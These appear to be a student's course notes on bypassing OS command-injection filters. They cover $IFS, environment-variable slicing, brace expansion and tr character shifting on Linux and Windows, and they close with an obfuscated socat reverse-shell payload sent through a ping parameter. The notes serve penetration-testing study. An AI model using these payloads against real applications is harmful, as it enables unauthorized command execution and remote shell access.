
## methodology:
1. find vulnerable parameters,
2. attempt basic character injection check for these: space, new line, /, ;
3. if they get blocked replace them with their equivelant from `env` but first print env
4. test on kali first and then on app
5. this is a good read: [PayloadsAllthingslink](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-without-space)
some web apps will blacklist some characters such as `/` or `;`
#####  Space Filters
A space is a commonly blacklisted character, especially if the input should not contain any spaces, like an IP, for example. Still, there are many ways to add a space character without actually using the space character!
### detecting filters
- firstly you will have to either inject a newline chr or try to insert a space
	if it gets denied then there's a space   filter and we've just found it

- try the encoded version of new line character `/n` which is `%0a` or tab 
`%09` `\t` 
combine \n with \t`
`127.0.0.1%0a%09`

----
# Character blacklist (slash semi colon space etc)

first, try to spit out all the environment variables with `printenv`
![](Pasted%20image%2020250529160229.png)

try `path:0:1`
`${IFS}` | space
`LH_COLORS`
Using the ($IFS) Linux Environment Variable may also work since its default value is a space and a tab

`127.0.0.1%0a${IFS}`
`${LS_COLORS:10:1}`
### brace expansion (bash)
we can use the `Bash Brace Expansion` feature, which automatically adds spaces between arguments wrapped between braces, as follows

```bash
{ls,-la}

total 0
drwxr-xr-x 1 21y4d 21y4d   0 Jul 13 07:37 .
```

(`127.0.0.1%0a{ls,-la}`)

## BYPASSING FILTERED CHARACTERS

### exercise
+ 1 Use what you learned in this section to execute the command 'ls -la'. What is the size of the 'index.php' file?
first we try 0%a \n, it passes the filter...
we try space after the %0a but it gets blocked, then we try the command directly after the %0a`ls` add a tab `%09`to execute the flag `-la` (bypasses space filter and does the same as normal space)
`ip=127.0.0.1%0als%09-la`

## / : ; filter bypasses (linux)

#### using env variables
The `printenv` command prints all environment variables in Linux, so you can look which ones may contain useful characters, and then try to reduce the string to that character only.

(bash index from 0)
For example, if we look at the `$PATH` environment variable in Linux, it may look something like the following:
```shell-session
echo ${PATH}

/usr/local/bin:/usr/bin:/bin:/usr/games
```

So, if we start at the `0` character, and only take a string of length `1`, we will end up with only the `/` character, which we can use in our payload:
```shell-session
echo ${PATH:0:1}

/
```
We can do the same with the `$HOME` or `$PWD` environment variables as well. We can also use the same concept to get a semi-colon character, to be used as an injection operator. For example, the following command gives us a semi-colon:
```shell-session
echo ${LS_COLORS:10:1}

;
```

![](Pasted%20image%2020250528190601.png)

So, let's try to use environment variables to add a semi-colon and a space to our payload (`127.0.0.1${LS_COLORS:10:1}${IFS}`) as our payload, and see if we can bypass the filter: 
![](cmdinj_filters_spaces_5.jpg)

### filter bypasses (windows)
to produce a slash in `Windows Command Line (CMD)`, we can `echo` a Windows variable (`%HOMEPATH%` -> `\Users\htb-student`), and then specify a starting position (`~6` -> `\htb-student`), and finally specifying a negative end position, which in this case is the length of the username `htb-student` (`-11` -> `\`) :

```cmd-session
C:\htb> echo %HOMEPATH:~6,-11%

\
```

this 1 works:
```
C:\Users\BoneFire>echo %HOMEPATH:~3,-1%
ers\BoneFir
```

### powershell
```powershell-session
PS C:\htb> $env:HOMEPATH[0]

\

PS C:\htb> $env:PROGRAMFILES[10]
PS C:\htb> $env:PROGRAMFILES[2]

\
```

![](Pasted%20image%2020250528191816.png)
## Character Shifting

There are other techniques to produce the required characters without using them, like `shifting characters`. For example, the following Linux command shifts the character we pass by `1`. 

So, all we have to do is find the character in the ASCII table that is just before our needed character (we can get it with `man ascii`), then add it instead of `[`   This way, the last printed character would be the one we need:
```shell-session
$ man ascii     # \ is on 92, before it is [ on 91
$ echo $(tr '!-}' '"-~'<<<[)

\
```
### 5. Why this helps with blacklists

If your attack surface forbids you from typing certain “dangerous” characters—say you can’t type `\` directly—this trick lets you _synthesize_ them by using a character you _are_ allowed (`[`) plus a bit of on-the-fly transliteration.

You can generalize this:

- Look up your target character’s ASCII code in `man ascii`.
- Find some allowed character whose code is just before (or after) it.
- Use `tr` with a mapping that shifts that allowed character into your forbidden one.


**Find your target character**’s  Assci value. eg 92 or `\`
- **Pick an allowed character** whose assci value is just 1 below the character you specified above,   91 (i.e. `[`).
- **Build a `tr` range** that shifts the entire ASCII block by +1:
this shifts an assci range starting from ! say 65 to exactly 1 character before your desired character so that if it gets incremented by 1 it becomes the required chacaracter.
- tr '!-}' '"-~' <<< [
# TLDR
The odd-looking `tr '!-}' '"-~'` is really just a concise way of saying “map every character in the printable-ASCII range from `!` up to `}` onto the next character in the range.” Here’s why it uses that exact syntax:

1. **Range notation in `tr`**  
    In `tr`, you can specify a contiguous sequence of characters by writing `A-Z`, `0-9`, or—even for punctuation—`!-}`. That literally means “start at `!` (ASCII 33) and go up through `}` (ASCII 125), one code-point at a time.”
    
2. **Why two sets of the same length?**  
    `tr SET1 SET2` replaces the _n_th character of `SET1` with the _n_th character of `SET2`. By giving two ranges of identical length—one shifted forward by 1 code point—you implement a +1 “Caesar shift” over that block.
    
    - **SET1**: `!-}` is ASCII 33..125
        
    - **SET2**: `"-~` is ASCII 34..126

## exploiting native tools: socat, netcat etcetra

1. run which command to check if they exist/or in user's bin
```
which <socat>
```
```shell-session
socat TCP4:10.10.14.5:8443 EXEC:/bin/bash
```
if it does:
A classic exploitation command to trigger OS command injection via socat is:
```bash
GET /ping.php?ip=127.0.0.1%0a's'o'c'a't'${IFS}TCP4:10.10.14.15:8443${IFS}EXEC:bash HTTP/1.1
```

Replace `ATTACKER_IP` with your IP address.
## EASY WAY
replace the number after the arrow with the number before your desired output

# Exercise
![](Pasted%20image%2020250529161338.png)
